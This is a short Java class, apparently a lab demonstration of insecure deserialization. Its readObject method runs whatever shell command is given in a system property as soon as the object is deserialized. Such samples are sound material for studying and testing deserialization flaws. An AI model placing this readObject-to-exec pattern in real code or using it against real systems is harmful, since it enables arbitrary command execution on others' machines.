package com.example;


import java.io.IOException;

public class BadCode implements java.io.Serializable
{
    public String name;
    public String address;

    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException
    {
        in.defaultReadObject();
        this.name = this.name+"!";
        System.out.println("-  Bad code now run bad system commands...");
        //Runtime.getRuntime().exec( HACKER_FILE );
        String cmd = System.getProperty( "serial-exploit-sh" );
        String loc = System.getProperty( "user.home" );
        System.out.println("execute loc=" + loc);


        if(cmd == null || cmd.length() == 0)
        {
            throw new RuntimeException( "Must set -Dserial-exploit-sh java system property" );
        }
        System.out.println("execute hacker command=" + cmd);
        Runtime.getRuntime().exec( cmd );
        System.out.println( "system command has been run.... ");
    }
}